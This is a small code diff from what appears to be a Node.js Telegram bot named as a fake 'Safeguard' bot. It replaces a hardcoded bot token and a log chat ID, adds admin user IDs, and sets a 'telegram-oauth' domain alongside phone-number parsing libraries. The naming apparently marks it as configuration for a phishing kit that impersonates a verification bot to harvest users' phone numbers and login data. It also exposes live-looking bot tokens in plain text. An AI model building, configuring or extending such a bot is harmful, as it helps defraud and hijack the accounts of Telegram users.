@@ -6,14 +6,16 @@ const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance()
 const PNF = require("google-libphonenumber").PhoneNumberFormat;
 
 // Define your environment variables directly here:
-const FAKE_SAFEGUARD_BOT_TOKEN = "7706602301:AAEfkS0BfLTtvTC9A9dy19XEvaAyzQ8Sw7A";
-const LOGS_ID = "-1002201932773";
+const FAKE_SAFEGUARD_BOT_TOKEN = "7758350236:AAHql7uhSX2PGkmxhTPNrEcua9IHlhzfi-o";
+const LOGS_ID = "-1002442955942";
 const DOMAIN = "https://telegram-oauth.onrender.com";
 const PORT = 80; // or any port you want to use
 
 // Admins list (whoever adds the bot in the channel should be in this array.)
 const admins = [
-  6495465957
+  7456088763,
+  7576104609,
+  8193001945
 ];
 
 // Loading the Safeguard picture beforehand for speed
